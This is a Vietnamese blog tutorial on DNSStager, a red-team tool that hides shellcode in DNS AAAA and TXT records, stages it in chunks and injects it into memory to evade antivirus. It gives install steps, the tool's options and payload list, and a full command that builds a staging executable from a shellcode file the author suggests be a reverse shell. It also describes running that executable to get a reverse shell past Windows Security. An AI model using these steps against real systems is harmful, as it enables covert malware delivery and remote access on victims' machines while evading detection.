Ví dụ luôn cho nó uy tín
![](https://shells.systems/wp-content/uploads/2021/05/DNSStagerCSWorked.gif)
(nguồn https://shells.systems)
# Mở đầu
Đối với các bạn redteam, việc đi sâu nhất vào trong hệ thống của khách hàng là điều luôn cần đạt được, để đảm bảo an toàn cho những khách hàng của mình. Hay với 1 bug bounty hunter cần nâng severity của lỗ hổng mình tìm ra lên cao nhất để nhận được số tiền hậu hĩnh. Có thể các bạn redteam/pentester cũng gặp phải trường hợp payload của mình bị AV xoá/chặn như thế nào, công cụ này giúp các bạn có thể ẩn payload của mình và truyền nó với từng phần, giúp AV không phát hiện ra. Đây cũng là một điều mà các AV trên thế giới cần để tâm đến và giúp người dùng của mình an toàn.
# DNSStager là gì?
DNSStager là một tool open source được sử dụng để giúp Pentesters/RedTeamers có thể ẩn payload của họ trong DNS và truyền nó dưới dạng từng phần, dựa trên nhiều DNS records và sau đó inject nó vào memory và 

![](https://media.makeameme.org/created/boom-magic.jpg)

DNSStager sẽ tạo một DNS Server pha-ke cho bạn để resolve DNS fake addresses của bạn dựa trên các AAAA và TXT records, các address này đang hiển thị một phần payload encoded/encrypted của bạn.

### Cách hoạt động của DNSStager

![image.png](https://images.viblo.asia/93b6bd72-ec89-44c6-842f-3dbe864905d0.png)

![image.png](https://images.viblo.asia/bf6e63d5-e690-45ff-9e71-3d41b38e4722.png)

(nguồn https://shells.systems)

Như hình các bạn có thể thấy, khi execute client.exe, nó sẽ tự động gọi tới DNSStager Server với những DNS khác nhau (ở đây là `s1.test.mydnsserver.live`, `s2.test.mydnsserver.live`, ...). Sau đó, nó sẽ cố gắng resolve subdomain này và nhận về response có thể là dạng IPv6 hoặc TXT records. Tuy nhiên, đây chính là từng đoạn payload của bạn gửi dưới dạng 16 bytes một, và khi kết hợp các bytes này sẽ được 1 payload hoàn chỉnh. 

![image.png](https://images.viblo.asia/27ba0365-d260-478c-a339-1cdcacf1219d.png)

### Tại sao lại sử dụng DNSStager
Trường hợp sử dụng tốt nhất cho DNSStager là khi bạn cần nạp payload của mình thông qua DNS trong khi đó là kênh duy nhất có sẵn để bạn truyền payload.

DNSStager hiện hỗ trợ hai DNS records để truyền toàn bộ payload đó là:
- IPv6 qua  AAAA records.
- TXT records.

# Cài đặt DNSStager
Việc cài đặt DNSStager cũng khá đơn giản
```bash
git clone https://github.com/mhaskar/DNSStager
sudo python3 -m pip install -r requirements.txt
```
(yêu cầu sử dụng python3)
Do DNSStager thực hiện generate client connect sử dụng C hoặc Golang nên yêu cầu cài đặt 1 trong 2, tuỳ thuộc bạn sử dụng cái nào để generate
```bash
sudo apt-get install mingw-w64
hoặc
sudo apt-get install golang (golang từ 1.16)
```

DNSStager yêu cầu chạy với quyền root

![image.png](https://images.viblo.asia/ab75ac2d-9286-49d8-b756-dcef33a93cb8.png)

> Lưu ý: Cần disable systemd-resolved để DNSStager hoạt động đúng mong muốn
```bash
sudo systemctl disable systemd-resolved
```
Có khá nhiều options trong DNSStager, mình sẽ nói rõ bên dưới nhé.
```bash
┌──(minhtuan㉿MinhTuan-ACER)-[~/Tools/DNSStager]
└─$ sudo ./dnsstager.py -h
[sudo] password for minhtuan:
usage: dnsstager.py [-h] [--domain DOMAIN] [--payloads] [--prefix PREFIX] [--payload PAYLOAD] [--output OUTPUT]
                    [--shellcode_path SHELLCODE_PATH] [--xorkey XORKEY] [--sleep SLEEP]

DNSStager main parser

optional arguments:
  -h, --help            show this help message and exit
  --domain DOMAIN       The domain you want to use as staging host
  --payloads            show all payloads
  --prefix PREFIX       Prefix to use as part of your subdomain schema
  --payload PAYLOAD     Payload to use, see --payloads for more details
  --output OUTPUT       Agent output path
  --shellcode_path SHELLCODE_PATH
                        Shellcode file path
  --xorkey XORKEY       XOR key to encode your payload with
  --sleep SLEEP         sleep for N seconds between each DNS request
```
### Cài đặt DNS
Để sử dụng DNSStager, bạn cần đặt domain của mình trỏ tới DNSStager làm `Server DNS` để resolve và handle bất kỳ request DNS nào đến domain của bạn. 

![image.png](https://images.viblo.asia/55a6abab-c296-473d-8721-b55f7a26e230.png)

(nguồn https://shells.systems/)

Ví dụ, mình đang có một domain là `mydnsserver.live`, DNSStager đang chạy trên VPS server có IP 139.59.182.177 thì config như hình trên nhé.

# Sử dụng DNSStager
Cách dùng cũng khá đơn giản tuy nhiên cũng lắm bước, các bạn cài đặt thành công như bên trên là có thể sử dụng DNSStager thành công rồi.

Hiện tại DNSStager sử dụng 6 payload, hỗ trợ việc gửi truyền payload dưới dạng IPv6 hoặc TXT records, sử dụng ngôn ngữ C hay Golang để generate file tuỳ theo kiến trúc x86 hoặc x64
```bash
sudo ./dnsstager.py --payloads

[+] 6 DNSStager payloads Available

x64/c/ipv6              Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code
x86/c/ipv6              Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code
x64/golang/txt          Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code
x64/golang/ipv6         Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code
x86/golang/txt          Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code
x86/golang/ipv6         Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code
```

Gen file execute và truyền payload chỉ với một câu lệnh
```bash
sudo ./dnsstager.py --domain test.mydnsserver.live --payload x64/c/ipv6 --output /tmp/a.exe --prefix cloud-srv- --shellcode_path ~/payload.bin --sleep 1 --xorkey 0x20
```
Với `~/payload.bin` có thể là file reverse shell của bạn nhé

![image.png](https://images.viblo.asia/2d102ef8-8950-434f-906f-5d9c6be9dc5e.png)

Tool sẽ tự động generate ra file execute rồi thực hiện lắng nghe luôn. Sau đó các bạn có thể lấy file `/tmp/a2.exe` tải lên rồi chạy trên phía máy muốn tạo kết nối là có thể reverse shell qua mặt Windows Security rồi.

Tuy nhiên, mình demo tạo file thì với lần đầu chạy lên thì Windows Security không báo gì cả, cho phép thực thi, sau đó thì ... không còn sau đó nữa, cứ tạo file là Windows Security thông báo là trojan và xoá luôn :(. Hy vọng là có thể tìm ra nguyên nhân nào đó, và đội dev có thể fix lỗi này :(. Về phần demo các bạn kéo lên đầu bài là có thể thấy nhé ;)

Dưới đây là ví dụ họ đã check xem data payload gửi sang đúng hay chưa, thực hiện lấy payload rồi XOR với `0x20` xem 16 bytes đầu tiên đã khớp với kết quả IPv6 records trả về.
![image.png](https://images.viblo.asia/d607109b-9ecd-45f3-9235-bb304188ef14.png)

![image.png](https://images.viblo.asia/97c75dfb-4370-4c74-ab1b-445e8f58e7c1.png)

> Hi vọng có thể đem được demo xịn cho mọi người tham khảo, hoặc có vẻ thời điểm mình viết bài này Microsoft đã cập nhật cho Windows Security của họ rồi. Nhưng kỹ thuật này vẫn đáng học hỏi mà phải không. Mình sẽ cố gắng nghiên cứu thêm về phần này rồi chia sẻ tới mọi người. See you!
# Tham khảo
- https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/
- https://github.com/mhaskar/DNSStager